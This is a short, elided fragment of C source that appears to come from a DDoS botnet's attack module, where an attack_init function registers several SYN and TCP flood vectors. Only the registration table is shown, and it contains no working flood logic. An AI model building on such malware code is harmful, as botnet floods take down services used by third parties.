...
BOOL attack_init(void)
{
	...
	add_attack(ATK_VEC_ASYN, (ATTACK_FUNC)attack_udp_asyn);
	add_attack(ATK_VEC_TCPALL, (ATTACK_FUNC)attack_udp_tcpall);
	add_attack(ATK_VEC_USYN, (ATTACK_FUNC)attack_udp_tcpusyn);
